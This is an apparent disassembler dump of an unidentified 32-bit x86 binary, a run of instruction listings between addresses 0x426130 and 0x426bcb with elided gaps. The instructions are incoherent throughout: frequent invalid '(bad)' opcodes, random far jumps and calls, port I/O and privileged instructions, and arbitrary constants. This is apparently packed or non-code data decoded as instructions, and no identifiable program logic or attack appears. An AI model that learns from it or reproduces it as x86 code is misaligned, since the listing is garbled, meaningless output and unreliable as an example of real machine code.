  426130:	cmp    al,0x8f
  426132:	(bad)  
  426133:	xor    al,0xa9
  426135:	retf   
  426136:	mov    al,ds:0x7fa58b61
  42613b:	jecxz  0x42616d
  42613d:	jns    0x426128
  42613f:	push   ebp
  426140:	sbb    al,BYTE PTR [ebx-0x61]
  426143:	inc    edx
  426144:	mov    ds:0xf85d24a9,eax
  426149:	repz mov eax,ds:0x8a174bc2
  42614f:	lea    edi,[ebx]
  426151:	xchg   esi,eax
  426152:	fcomip st,st(6)
  426154:	popa   
  426155:	pop    ds
  426156:	or     bh,BYTE PTR [ebp-0x3a]
  426159:	mov    eax,ds:0x3d7b148b
  42615e:	fcmovbe st,st(6)
  426160:	push   esp
  426161:	pop    edi
  426162:	push   esi
  426163:	or     BYTE PTR [ecx-0x53],al
  426166:	or     ebx,DWORD PTR [eax+eax*4-0x42]
  42616a:	fnclex 
  42616c:	mov    cl,0xc3
  42616e:	add    DWORD PTR [ebp+0xe967230],eax
  426174:	outs   dx,DWORD PTR ds:[esi]
  426175:	imul   eax,DWORD PTR [eax-0x4d],0xfffffffc
  426179:	aam    0x91
  42617b:	lock fist WORD PTR [eax-0x1a]
  42617f:	add    BYTE PTR [edi],dl
  426181:	mov    ds:0xcc8ff9d6,al
  426186:	fisubr DWORD PTR es:0xaaf44537
  42618d:	sti    
  42618e:	xor    dh,dl
  426190:	xchg   ebp,eax
  426191:	out    dx,al
  426192:	jg     0x42618e
  426194:	inc    edi
  426195:	enter  0x541a,0x6d
  426199:	cmp    esi,DWORD PTR [eax]
  42619b:	clc    
  42619c:	aad    0x4a
  42619e:	adc    ebp,0x7f312eb3
  4261a4:	fistp  QWORD PTR [edi+0x21]
  4261a7:	xor    eax,0xc976ada3
  4261ac:	and    al,0x61
  4261ae:	add    al,0x85
  4261b0:	in     al,dx
  4261b1:	jg     0x4261fb
  4261b3:	sub    ch,BYTE PTR [edi-0x27]
  4261b6:	jecxz  0x42622f
  4261b8:	retf   0x5277
  4261bb:	lahf   
  4261bc:	cmc    
  4261bd:	in     eax,0xf
  4261bf:	loopne 0x4261de
  4261c1:	mov    BYTE PTR [esi+0x11dc6699],0x29
  4261c8:	int    0x8d
  4261ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261cb:	and    eax,0xf1ce21f3
  4261d0:	push   ebx
  4261d1:	mov    dl,0x25
  4261d3:	bound  esp,QWORD PTR [esi+0x68]
  4261d6:	cmp    DWORD PTR [ecx-0x41],edx
  4261d9:	xchg   esi,eax
  4261da:	call   0x6c8a039d
  4261df:	imul   esp,ebp,0xffffffbb
  4261e2:	mov    BYTE PTR [edi-0x3c],cl
  4261e5:	pushf  
  4261e6:	jecxz  0x4261de
  4261e8:	xchg   esp,eax
  4261e9:	pop    edx
  4261ea:	rcr    DWORD PTR [ebx+0x4b],cl
  4261ed:	inc    edi
	...
  426256:	fwait
  426257:	and    DWORD PTR [edi],ecx
  426259:	popa   
  42625a:	mov    edi,0xb7fbff6f
  42625f:	xor    DWORD PTR [ecx-0x28ba28d9],0xffffffc2
  426266:	addr16 cdq 
  426268:	add    DWORD PTR [eax],eax
  42626a:	add    BYTE PTR [ecx],al
  42626c:	add    BYTE PTR [eax],al
  42626e:	adc    esp,DWORD PTR [edx-0xddabc1e]
  426274:	pop    ebx
  426275:	pop    edi
  426276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426278:	and    DWORD PTR [esi-0x202af956],0xc5ba50df
  426282:	(bad)  
  426283:	stos   DWORD PTR es:[edi],eax
  426284:	inc    edx
  426285:	lock daa 
  426287:	inc    DWORD PTR [ebx-0xc]
  42628a:	xor    dl,BYTE PTR [edx]
  42628c:	push   edi
  42628d:	shl    BYTE PTR [edi+0x4ba0dc9f],cl
  426293:	(bad)  
  426294:	or     edi,DWORD PTR [ebx-0x21]
  426297:	jae    0x42624f
  426299:	jbe    0x426226
  42629b:	hlt    
  42629c:	outs   dx,DWORD PTR ds:[esi]
  42629d:	(bad)  
  42629e:	pop    ebx
  42629f:	xor    BYTE PTR [bp+di+0x59],0xbb
  4262a4:	or     ebp,DWORD PTR [edi]
  4262a6:	(bad)  
  4262a8:	jnp    0x42627a
  4262aa:	inc    ebx
  4262ab:	and    BYTE PTR [ecx-0x520d7de9],0x7c
  4262b2:	mov    ds:0xdfedddf9,eax
  4262b7:	clc    
  4262b8:	mov    ah,0xe9
  4262ba:	xor    bl,BYTE PTR [edi]
  4262bc:	xchg   edx,eax
  4262bd:	xchg   ebx,eax
  4262be:	hlt    
  4262bf:	mov    esp,0x3e9b9804
  4262c4:	pop    es
  4262c5:	pop    edx
  4262c6:	(bad)  
  4262c7:	mov    edi,0x57107869
  4262cc:	rcl    DWORD PTR [edi-0xbf4d4df],cl
  4262d2:	into   
  4262d3:	cmp    DWORD PTR [esi+0x5b],edi
  4262d6:	pop    edx
  4262d7:	mov    esp,0x76e20f99
  4262dc:	pop    es
  4262dd:	mov    edi,DWORD PTR [ebp+0x6a3cc376]
  4262e3:	rol    bl,0x65
  4262e6:	xchg   esp,eax
  4262e7:	xchg   BYTE PTR [edx+ecx*1+0x59],dh
  4262eb:	aad    0x9c
  4262ed:	pop    esi
  4262ee:	jl     0x4262e3
  4262f0:	and    dl,BYTE PTR [esi-0x63341b97]
  4262f6:	ins    DWORD PTR es:[edi],dx
  4262f7:	jp     0x426326
  4262f9:	xor    dh,bl
  4262fb:	test   DWORD PTR ds:0xbe761c10,ebx
  426301:	data16 ja 0x4262c9
  426304:	aaa    
  426305:	call   0x6017eaca
  42630a:	cmp    DWORD PTR [edx+esi*2-0x1b],ebx
  42630e:	repz and DWORD PTR [ebx],edx
  426311:	push   esp
  426312:	add    al,0xd0
  426314:	push   cs
  426315:	pushf  
  426316:	inc    edx
  426317:	in     al,dx
  426318:	call   0x4eba9f94
  42631d:	ret    
  42631e:	sysexit 
  426320:	pop    ebp
  426321:	(bad)  
  426322:	test   eax,0x7c762b0d
  426327:	pop    esp
  426328:	lock push esi
  42632a:	pop    esi
  42632b:	call   0x53358278
  426330:	inc    esp
  426331:	mov    al,0x72
  426333:	and    eax,0x3f2fc270
  426338:	je     0x4263b4
  42633a:	popa   
  42633b:	mov    BYTE PTR [edx-0x24e35d84],bh
  426341:	out    0x1b,eax
  426343:	imul   edx,DWORD PTR [ebp+0x69ba939b],0x45f149ae
  42634d:	xor    ebx,ecx
  42634f:	pop    edx
  426350:	jge    0x4263b1
  426352:	and    eax,0x173ffab1
  426357:	(bad)  
  426358:	enter  0x546a,0x64
  42635c:	sti    
  42635d:	sbb    eax,0x36f5d90b
  426362:	stos   BYTE PTR es:[edi],al
  426363:	and    BYTE PTR ds:0x54e51f46,al
  426369:	test   al,0x28
  42636b:	shr    al,cl
  42636d:	lock add BYTE PTR [eax],al
	...
  4263d4:	add    BYTE PTR [eax],al
  4263d6:	push   esp
  4263d7:	and    eax,0xeefd4e8d
  4263dc:	xlat   BYTE PTR ds:[ebx]
  4263dd:	aas    
  4263de:	dec    ecx
  4263df:	sbb    esi,edi
  4263e1:	or     eax,0xea5a416f
  4263e6:	addr16 call 0x0:0x1000001
  4263ee:	cwde   
  4263ef:	arpl   WORD PTR [edx-0x76],di
  4263f2:	or     eax,0x76b0b402
  4263f7:	in     eax,dx
  4263f8:	je     0x426427
  4263fa:	push   ebx
  4263fb:	icebp  
  4263fc:	adc    esi,DWORD PTR [esi-0x3c5b6273]
  426402:	mov    ecx,0xd23afa61
  426407:	ins    DWORD PTR es:[edi],dx
  426408:	and    esi,DWORD PTR [ecx+esi*4+0x18]
  42640c:	dec    edi
  42640d:	push   0x7ad2b707
  426412:	nop
  426413:	inc    eax
  426414:	pop    edx
  426415:	dec    ebp
  426416:	mov    bl,0xfd
  426418:	(bad)  
  426419:	repnz or BYTE PTR [ebx*4-0x2a4b9bbb],dl
  426421:	aaa    
  426422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426423:	cmp    ch,ch
  426425:	cwde   
  426426:	dec    esp
  426427:	stos   DWORD PTR es:[edi],eax
  426428:	into   
  426429:	(bad)  [edi+ecx*1-0x4e78b196]
  426430:	in     al,dx
  426431:	call   0x28a015fa
  426436:	mov    esi,0xcddd74f2
  42643b:	sub    DWORD PTR [eax],ebx
  42643d:	shl    ecx,0x49
  426440:	sar    BYTE PTR [ebp+0x7fb38878],cl
  426446:	outs   dx,DWORD PTR ds:[esi]
  426447:	in     al,dx
  426448:	loop   0x426424
  42644a:	ja     0x42643f
  42644c:	inc    ebp
  42644d:	inc    edi
  42644e:	test   al,0x77
  426450:	pop    ds
  426451:	scas   al,BYTE PTR es:[edi]
  426452:	or     BYTE PTR [esi],cl
  426454:	stos   BYTE PTR es:[edi],al
  426455:	fld    TBYTE PTR [edx]
  426457:	cmp    ecx,DWORD PTR cs:[edi+0x58528b8e]
  42645e:	push   ecx
  42645f:	cmp    eax,0x12b47413
  426464:	jns    0x426457
  426466:	jge    0x4264a3
  426468:	sbb    BYTE PTR [ebx+ecx*4],0xe3
  42646c:	stos   DWORD PTR es:[edi],eax
  42646d:	loope  0x426491
  42646f:	stos   DWORD PTR es:[edi],eax
  426470:	sbb    cl,BYTE PTR [ecx-0x5b]
  426473:	sahf   
  426474:	lds    ebx,FWORD PTR [edx-0x16757eae]
  42647a:	in     eax,0xee
  42647c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42647d:	clc    
  42647e:	adc    ecx,esp
  426480:	(bad)  
  426481:	in     al,0xa9
  426483:	mov    WORD PTR [ebx-0x7b5bbeba],?
  426489:	push   esp
  42648a:	mov    edi,0xa30a19c5
  42648f:	cmp    ecx,DWORD PTR [ebp-0x58a2366a]
  426495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426496:	or     al,0xff
  426498:	mov    WORD PTR [edx-0x43],ds
  42649b:	sub    ah,BYTE PTR [ecx]
  42649d:	push   esi
  42649e:	nop
  42649f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4264a0:	(bad)  
  4264a1:	sbb    eax,0xb66aa04f
  4264a6:	mov    bl,0x4e
  4264a8:	out    0x16,al
  4264aa:	push   eax
  4264ab:	test   al,0xa6
  4264ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264af:	outs   dx,BYTE PTR ds:[esi]
  4264b0:	push   0x2e
  4264b2:	pusha  
  4264b3:	cmp    cl,BYTE PTR [edi+0x63c95832]
  4264b9:	je     0x426483
  4264bb:	push   ebx
  4264bc:	push   ss
  4264bd:	dec    edi
  4264be:	inc    esp
  4264bf:	retf   
  4264c0:	pop    ecx
  4264c1:	jne    0x42653f
  4264c3:	inc    esp
  4264c4:	xchg   ecx,eax
  4264c5:	mov    edx,0x4ca1cd2e
  4264ca:	mov    esi,0xfe649110
  4264cf:	cmp    ebp,ebx
  4264d1:	js     0x4264c4
  4264d3:	jmp    0x4264f6
  4264d5:	add    al,0xde
  4264d7:	test   al,0x8c
  4264d9:	jnp    0x4264b3
  4264db:	jmp    0x426521
  4264dd:	jns    0x426488
  4264df:	pop    ebp
  4264e0:	sub    BYTE PTR [ecx],cl
  4264e2:	cdq    
  4264e3:	data16 add ch,BYTE PTR [ecx-0xf]
  4264e7:	mov    ds:0x3f38e2cd,eax
  4264ec:	popa   
  4264ed:	or     al,BYTE PTR [eax]
	...
  426553:	add    BYTE PTR [eax],al
  426555:	add    BYTE PTR [ecx+0x6f],ch
  426558:	mov    BYTE PTR [eax],cl
  42655a:	mov    gs,edi
  42655c:	jmp    0x8abb74d0
  426561:	test   esi,esi
  426563:	lock jmp 0x0:0x19b677c
  42656b:	add    DWORD PTR [eax],eax
  42656d:	add    BYTE PTR [esi],al
  42656f:	ds sub al,cl
  426572:	jmp    0x426533
  426574:	lock loop 0x426521
  426577:	push   eax
  426578:	push   edx
  426579:	sahf   
  42657a:	and    DWORD PTR [edx-0x6601894a],edi
  426580:	test   al,0x23
  426582:	mov    ds:0xc67d1931,al
  426587:	xlat   BYTE PTR ds:[ebx]
  426588:	pushf  
  426589:	jmp    0x4265a9
  42658b:	mov    eax,0x2f16a186
  426590:	jno    0x4265ad
  426592:	addr16 dec ecx
  426594:	rcl    DWORD PTR [ebx],cl
  426596:	mov    ds:0x6c460cc6,eax
  42659b:	sub    cl,ah
  42659d:	mov    ebp,0xe793cc69
  4265a2:	pusha  
  4265a3:	mov    dh,0xed
  4265a5:	out    0x56,eax
  4265a7:	out    dx,eax
  4265a8:	test   al,0x3e
  4265aa:	fcomp  QWORD PTR [ebp+0xb]
  4265ad:	sub    BYTE PTR [esi+eax*8-0x78],bh
  4265b1:	dec    ebp
  4265b2:	push   ebx
  4265b3:	cmp    edx,esp
  4265b5:	inc    ecx
  4265b6:	jns    0x4265bf
  4265b8:	inc    ebx
  4265b9:	xchg   ebp,eax
  4265ba:	inc    BYTE PTR [ebp-0x4f500620]
  4265c0:	ja     0x426544
  4265c2:	out    dx,al
  4265c3:	aad    0x85
  4265c5:	mov    bh,0xfe
  4265c7:	daa    
  4265c8:	dec    BYTE PTR [ecx]
  4265ca:	lds    ebp,FWORD PTR [edx+0x74]
  4265cd:	xor    DWORD PTR [ebp-0x3bd99fcb],eax
  4265d3:	dec    ax
  4265d5:	std    
  4265d6:	and    cl,BYTE PTR ds:[ecx+eax*2-0x1d]
  4265db:	pop    es
  4265dc:	and    BYTE PTR [ebx-0x56],bh
  4265df:	xor    edx,eax
  4265e1:	cmp    cl,cl
  4265e3:	add    ah,BYTE PTR [edx-0x27887740]
  4265e9:	and    al,0xf8
  4265eb:	jp     0x426581
  4265ed:	mov    ds,WORD PTR [ecx-0x72]
  4265f0:	sar    ch,1
  4265f2:	call   0xc785:0x12eaa4d
  4265f9:	js     0x426642
  4265fb:	stc    
  4265fc:	inc    ebp
  4265fd:	arpl   ax,si
  4265ff:	fst    QWORD PTR [esi-0x65]
  426602:	cld    
  426603:	or     al,0xbe
  426605:	pop    ebp
  426606:	push   ecx
  426607:	dec    ebp
  426608:	mov    edi,0x7ea627d4
  42660d:	mov    al,ds:0xa6506bba
  426612:	data16 sbb al,BYTE PTR [ecx]
  426615:	jne    0x426689
  426617:	js     0x4265d2
  426619:	or     dl,BYTE PTR [ebp+0x2b]
  42661c:	sti    
  42661d:	inc    ecx
  42661e:	push   ds
  42661f:	mov    eax,0x68e50e21
  426624:	ret    0x27bd
  426627:	sar    DWORD PTR [esi+0x15acdaf7],1
  42662d:	push   edi
  42662e:	and    eax,0x15d7ceb0
  426633:	mov    ebp,0x5044a1bd
  426638:	int    0x7c
  42663a:	pop    esi
  42663b:	das    
  42663c:	mov    bl,0xcc
  42663e:	pusha  
  42663f:	fwait
  426640:	lahf   
  426641:	arpl   WORD PTR [edx+0x859f295],si
  426647:	and    BYTE PTR [ebx],bh
  426649:	mov    ah,0xbb
  42664b:	into   
  42664c:	mov    ecx,0xb678c401
  426651:	cmc    
  426652:	inc    esp
  426653:	sub    eax,0xbfe1c7ee
  426658:	jmp    0x4266ac
  42665a:	and    ebp,DWORD PTR [ebp-0x4e]
  42665d:	retf   
  42665e:	pop    es
  42665f:	adc    esi,DWORD PTR [edx-0x36]
  426662:	or     eax,0x23b202a5
  426667:	loop   0x426655
  426669:	aad    0x11
  42666b:	lods   eax,DWORD PTR ds:[esi]
  42666c:	sbb    eax,0xc3
	...
  4266d5:	add    BYTE PTR [edx],dl
  4266d7:	retf   
  4266d8:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4266de:	pop    DWORD PTR [edi-0x1f92925c]
  4266e4:	js     0x426687
  4266e6:	addr16 pushf 
  4266e8:	add    DWORD PTR [eax],eax
  4266ea:	add    BYTE PTR [ecx],al
  4266ec:	add    BYTE PTR [eax],al
  4266ee:	mov    eax,0x979c9899
  4266f3:	fist   DWORD PTR [ecx]
  4266f5:	sbb    BYTE PTR ds:0x4d3e0492,ch
  4266fb:	out    0x8,eax
  4266fd:	dec    esp
  4266fe:	inc    al
  426700:	pop    edi
  426701:	push   DWORD PTR [edx]
  426703:	inc    ebp
  426704:	push   ebp
  426705:	xor    ecx,DWORD PTR [eax]
  426707:	iret   
  426708:	ins    BYTE PTR es:[edi],dx
  426709:	jg     0x4266bd
  42670b:	pop    esi
  42670c:	aad    0x45
  42670e:	xlat   BYTE PTR gs:[ebx]
  426710:	and    al,0x95
  426712:	mov    esi,0x1d608642
  426717:	mov    esi,0x40470818
  42671c:	xchg   esi,eax
  42671d:	dec    ebx
  42671e:	repnz icebp 
  426720:	push   es
  426721:	lahf   
  426722:	adc    BYTE PTR [edx],bh
  426724:	pop    ss
  426725:	cdq    
  426726:	rcl    bl,cl
  426728:	pop    ebp
  426729:	sbb    ebp,DWORD PTR [edx]
  42672b:	aam    0x4f
  42672d:	ins    DWORD PTR es:[edi],dx
  42672e:	mov    edx,0x65ae7c7
  426733:	or     BYTE PTR [edi+edi*4+0x78],bh
  426737:	ror    DWORD PTR [esi-0x538f089e],0xad
  42673e:	push   es
  42673f:	das    
  426740:	pop    ecx
  426741:	loop   0x426730
  426743:	mov    ecx,0x7469cf4a
  426748:	dec    ebx
  426749:	adc    al,0xd4
  42674b:	push   eax
  42674c:	xchg   DWORD PTR [esi+0x1ac95498],esi
  426752:	xchg   ebp,eax
  426753:	ds xchg edi,eax
  426755:	mov    esp,0x73685bdd
  42675a:	pop    eax
  42675b:	cmp    DWORD PTR [edi+eiz*4+0x76],eax
  42675f:	sbb    bl,BYTE PTR [edx-0x64]
  426762:	jb     0x426739
  426764:	scas   al,BYTE PTR es:[edi]
  426765:	or     eax,0x90907c8b
  42676a:	or     ah,cl
  42676c:	adc    BYTE PTR [ebx+edi*8+0x2d],cl
  426770:	push   ebp
  426771:	push   0x143ffda3
  426776:	mov    al,ds:0x1fe7ef17
  42677b:	add    BYTE PTR [edx-0x2e3bc81d],0xc5
  426782:	clc    
  426783:	xchg   BYTE PTR [ebx+0x2e],dl
  426786:	nop
  426787:	mov    ch,0x20
  426789:	jbe    0x4267eb
  42678b:	loope  0x426764
  42678d:	repz (bad) 
  42678f:	ficomp WORD PTR [edi-0x65a44d01]
  426795:	int3   
  426796:	out    0x51,al
  426798:	shl    cl,0x24
  42679b:	or     DWORD PTR [edx-0x6a380644],ecx
  4267a1:	xchg   edi,eax
  4267a2:	clc    
  4267a3:	clc    
  4267a4:	rol    DWORD PTR [edi*8-0x268284e3],1
  4267ab:	cmc    
  4267ac:	inc    eax
  4267ad:	lahf   
  4267ae:	fcom   DWORD PTR [ecx+0x301f7207]
  4267b4:	sbb    al,0x7c
  4267b6:	pop    ss
  4267b7:	test   edi,edx
  4267b9:	push   esi
  4267ba:	(bad)  [eax]
  4267bc:	jb     0x4267ac
  4267be:	es leave 
  4267c0:	inc    esi
  4267c1:	jae    0x426811
  4267c3:	leave  
  4267c4:	ret    
  4267c5:	sbb    eax,0xd9522130
  4267ca:	repz cmp BYTE PTR [ecx],dl
  4267cd:	xchg   edx,eax
  4267ce:	adc    ecx,DWORD PTR [ebp+0x6347c7f8]
  4267d4:	mov    esp,DWORD PTR gs:[edx+0x352a0883]
  4267db:	or     al,0x55
  4267dd:	adc    ebp,DWORD PTR [ebx-0x7c30f227]
  4267e3:	mov    esi,0xd5981c8c
  4267e8:	mov    cl,ch
  4267ea:	push   ss
  4267eb:	ja     0x4267ce
  4267ed:	push   edx
	...
  426856:	mov    eax,0xff2ace8d
  42685b:	imul   edi,esp,0xffffff9f
  42685e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685f:	and    dh,0xca
  426862:	dec    ebx
  426863:	pop    esi
  426864:	dec    ecx
  426865:	das    
  426866:	addr16 popf 
  426868:	add    DWORD PTR [eax],eax
  42686a:	add    BYTE PTR [ecx],al
  42686c:	add    BYTE PTR [eax],al
  42686e:	fmul   DWORD PTR [esi+eiz*4]
  426871:	pop    ecx
  426872:	sub    eax,0xd57b7c69
  426877:	cwde   
  426878:	fwait
  426879:	cmp    BYTE PTR [edx],ah
  42687b:	mov    ah,0x91
  42687d:	xor    al,0x5b
  42687f:	addr16 inc eax
  426881:	dec    edi
  426882:	sub    ecx,DWORD PTR [eax]
  426884:	xor    DWORD PTR [edx],0x97377a53
  42688a:	je     0x4268eb
  42688c:	push   0xfffffff8
  42688e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42688f:	call   0x3e9e:0x2c133a45
  426896:	sbb    bh,bl
  426898:	nop
  426899:	and    edi,esp
  42689b:	arpl   WORD PTR [eax],di
  42689d:	pusha  
  42689e:	inc    ebx
  42689f:	and    ecx,DWORD PTR [esi+0x4e]
  4268a2:	arpl   WORD PTR [edi+0x7143200],dx
  4268a8:	xchg   esi,eax
  4268a9:	in     eax,dx
  4268aa:	push   es
  4268ab:	imul   esp,DWORD PTR [eax],0xffffffdc
  4268ae:	adc    al,0x9c
  4268b0:	xchg   DWORD PTR [ebx],edi
  4268b2:	icebp  
  4268b3:	xchg   edx,eax
  4268b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268b5:	imul   ebx,DWORD PTR [edi],0x37056693
  4268bb:	sbb    esp,ebp
  4268bd:	jns    0x426937
  4268bf:	mov    ch,0x22
  4268c1:	int3   
  4268c2:	arpl   WORD PTR [edi+0x1f9f7a31],bp
  4268c8:	jle    0x426911
  4268ca:	push   ebx
  4268cb:	jge    0x426934
  4268cd:	cld    
  4268ce:	adc    edx,DWORD PTR [edx+0x20]
  4268d1:	push   cs
  4268d2:	mov    al,0x1f
  4268d4:	out    dx,al
  4268d5:	fwait
  4268d6:	test   eax,0xc6224c7b
  4268db:	pushf  
  4268dc:	(bad)  
  4268dd:	repz pop esp
  4268df:	es add al,0x19
  4268e2:	les    edi,FWORD PTR [ecx+0x3b]
  4268e5:	inc    esi
  4268e6:	pusha  
  4268e7:	mov    ch,0x8e
  4268e9:	xchg   ebx,eax
  4268ea:	xor    dh,BYTE PTR [edx-0x708e7f3]
  4268f0:	push   es
  4268f1:	mov    edi,0xb095e107
  4268f6:	push   ebx
  4268f7:	daa    
  4268f8:	jmp    0x426926
  4268fa:	icebp  
  4268fb:	xchg   esi,eax
  4268fc:	sub    ecx,ebx
  4268fe:	inc    eax
  4268ff:	mov    bh,0xcd
  426901:	int3   
  426902:	ds outs dx,BYTE PTR fs:[esi]
  426905:	dec    esi
  426906:	popf   
  426907:	fist   WORD PTR [esi+0x29]
  42690a:	mov    ebp,0x2143e2cf
  42690f:	loope  0x42698c
  426911:	pop    ecx
  426912:	std    
  426913:	mov    dh,0x7b
  426915:	mov    ebx,0xd36d7a61
  42691a:	push   es
  42691b:	loopne 0x426901
  42691d:	mov    edi,0x4a53cc89
  426922:	outs   dx,BYTE PTR ds:[esi]
  426923:	lea    esp,[edx-0x52]
  426926:	not    DWORD PTR [ecx-0x2]
  426929:	push   edi
  42692a:	mov    BYTE PTR [eax+esi*2+0x223fdefc],cl
  426931:	add    dh,dh
  426933:	or     al,0x8
  426935:	mov    ch,0xf9
  426937:	das    
  426938:	loope  0x426963
  42693a:	clc    
  42693b:	add    eax,0x6bf52090
  426940:	pop    edx
  426941:	call   0x2c462ad5
  426946:	call   0x6657b39c
  42694b:	add    eax,0xdb8af9db
  426950:	jbe    0x426944
  426952:	mov    BYTE PTR [ebx-0x6da6dd57],bl
  426958:	stos   DWORD PTR es:[edi],eax
  426959:	push   ebp
  42695a:	xor    DWORD PTR [ebx-0x28],ebp
  42695d:	fbstp  TBYTE PTR [ebx+ebx*1]
  426960:	int3   
  426961:	ror    DWORD PTR ds:0x45c216c2,cl
  426967:	(bad)
  42696b:	imul   edx,DWORD PTR [ebx*4+0x0],0x0
	...
  4269d6:	mov    WORD PTR [esi+0x7d],cs
  4269d9:	jge    0x4269da
  4269db:	jg     0x426969
  4269dd:	jmp    FWORD PTR [ebx]
  4269df:	in     al,dx
  4269e0:	lahf   
  4269e1:	mov    esi,DWORD PTR [ebx+0x24]
  4269e4:	jl     0x42696e
  4269e6:	addr16 sahf 
  4269e8:	add    DWORD PTR [eax],eax
  4269ea:	add    BYTE PTR [ecx],al
  4269ec:	add    BYTE PTR [eax],al
  4269ee:	sub    BYTE PTR [edi-0x405d709b],0x28
  4269f5:	mov    eax,0x995bf82b
  4269fa:	stos   BYTE PTR es:[edi],al
  4269fb:	pop    esi
  4269fc:	stos   BYTE PTR es:[edi],al
  4269fd:	cwde   
  4269fe:	cli    
  4269ff:	(bad)  
  426a00:	or     eax,0xe82f2ad6
  426a05:	pop    ds
  426a06:	mov    edi,DWORD PTR [edx+0x38]
  426a09:	ja     0x426a21
  426a0b:	add    edx,DWORD PTR [ecx+0x215e7a35]
  426a11:	outs   dx,DWORD PTR ds:[esi]
  426a12:	sbb    DWORD PTR [edx-0x38],ebx
  426a15:	std    
  426a16:	xchg   edx,eax
  426a17:	sub    DWORD PTR [edx+edi*1-0x7b],edi
  426a1b:	and    dl,BYTE PTR [edi]
  426a1d:	jae    0x426a11
  426a1f:	adc    eax,0x67cf31ed
  426a24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a25:	dec    esp
  426a26:	imul   ebx,DWORD PTR [ecx+0x7a],0x40
  426a2a:	push   edx
  426a2b:	mov    dl,0x65
  426a2d:	jmp    0x27bd:0x9530ba2b
  426a34:	jbe    0x426a8f
  426a36:	sub    eax,0x911b736c
  426a3b:	jns    0x4269bd
  426a3d:	and    al,0xdf
  426a3f:	cmp    al,0x4d
  426a41:	jle    0x426a90
  426a43:	fisttp WORD PTR [ebx+edi*8]
  426a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a47:	xor    ebx,DWORD PTR [edi+0x42]
  426a4a:	jmp    0xc571:0x4e224d08
  426a51:	mov    BYTE PTR [esi],0x79
  426a54:	mov    ebx,0x2a49cee1
  426a59:	lods   al,BYTE PTR ds:[esi]
  426a5a:	jle    0x426ad6
  426a5c:	clc    
  426a5d:	inc    ebp
  426a5e:	imul   esp,DWORD PTR [ecx],0x6ffd3bd6
  426a64:	mov    ebx,0xe45f06d9
  426a69:	and    DWORD PTR [eax-0xe],ecx
  426a6c:	icebp  
  426a6d:	jmp    0x5aab:0xc45a6d2c
  426a74:	lock add eax,0x74e49381
  426a7a:	jnp    0x426a61
  426a7c:	fidivr WORD PTR [ebp+0x5d]
  426a7f:	test   al,0xfd
  426a81:	out    dx,eax
  426a82:	sub    DWORD PTR ds:0xac6ca7fe,edx
  426a88:	arpl   WORD PTR [edi+ecx*1],bp
  426a8b:	adc    BYTE PTR [ebx*8-0x74de9e25],ch
  426a92:	in     al,0x23
  426a94:	cmc    
  426a95:	push   es
  426a96:	aam    0x98
  426a98:	xor    eax,0xb7677336
  426a9d:	(bad)  
  426a9e:	mov    cl,0x1a
  426aa0:	push   es
  426aa1:	inc    ecx
  426aa2:	pop    edx
  426aa3:	mov    eax,0x1b39e419
  426aa8:	mov    edx,0x3883c0a5
  426aad:	jp     0x426a4b
  426aaf:	hlt    
  426ab0:	js     0x426a5d
  426ab2:	(bad)  [ecx-0x5a]
  426ab5:	in     eax,dx
  426ab6:	jp     0x426ac6
  426ab8:	pop    ds
  426ab9:	(bad)  
  426aba:	call   0x165f031b
  426abf:	mov    dl,BYTE PTR [eax+edi*4]
  426ac2:	div    DWORD PTR [eax-0x3b131b88]
  426ac8:	add    eax,0x608f31f5
  426acd:	ret    0x21df
  426ad0:	in     eax,dx
  426ad1:	test   eax,0x4acca1f
  426ad6:	inc    esp
  426ad7:	xor    BYTE PTR [eax+ecx*8+0x5c],0x34
  426adc:	je     0x426a9e
  426ade:	dec    ebp
  426adf:	retf   
  426ae0:	stos   DWORD PTR es:[edi],eax
  426ae1:	fistp  WORD PTR [esi]
  426ae3:	leave  
  426ae4:	mov    ch,0xf4
  426ae6:	mov    DWORD PTR [edx-0x7f],ecx
  426ae9:	shr    BYTE PTR [ebp+0xe1fc03],0x0
	...
  426b54:	add    BYTE PTR [eax],al
  426b56:	cdq    
  426b57:	sub    BYTE PTR ds:0xdb77bd56,cl
  426b5d:	out    dx,eax
  426b5e:	inc    esi
  426b5f:	sub    DWORD PTR [esi],edi
  426b61:	or     al,0x78
  426b63:	out    0xac,eax
  426b65:	sbb    DWORD PTR [edi-0x61],esp
  426b68:	add    DWORD PTR [eax],eax
  426b6a:	add    BYTE PTR [ecx],al
  426b6c:	add    BYTE PTR [eax],al
  426b6e:	mov    edx,0x407c714a
  426b73:	inc    esp
  426b74:	(bad)  
  426b75:	push   cs
  426b76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b77:	add    al,0x3f
  426b79:	add    eax,0xb3a9ea59
  426b7e:	mov    dl,0x63
  426b80:	(bad)  
  426b81:	das    
  426b82:	push   ax
  426b84:	cmp    BYTE PTR [ecx+0x573fd766],0xa4
  426b8b:	mov    dh,0x26
  426b8d:	inc    ecx
  426b8e:	lahf   
  426b8f:	cmp    al,0xc6
  426b91:	out    dx,eax
  426b92:	xor    eax,0xb6cf5d90
  426b97:	(bad)  
  426b98:	stos   DWORD PTR es:[edi],eax
  426b99:	mov    ds:0x8f47c2d0,eax
  426b9e:	mov    dh,0x92
  426ba0:	icebp  
  426ba1:	jb     0x426c1e
  426ba3:	pop    esp
  426ba4:	rcr    DWORD PTR [edi+0x76],1
  426ba7:	ret    0x2b10
  426baa:	sub    bl,ch
  426bac:	adc    al,0x93
  426bae:	rol    DWORD PTR [eax-0x9470817],1
  426bb4:	adc    al,0x85
  426bb6:	cmp    al,0x22
  426bb8:	xor    al,0x28
  426bba:	jmp    0x44cdabd1
  426bbf:	push   ss
  426bc0:	mov    esi,0xd25d59ca
  426bc5:	mov    eax,gs:0xcadd2937
  426bcb:	push   ebx
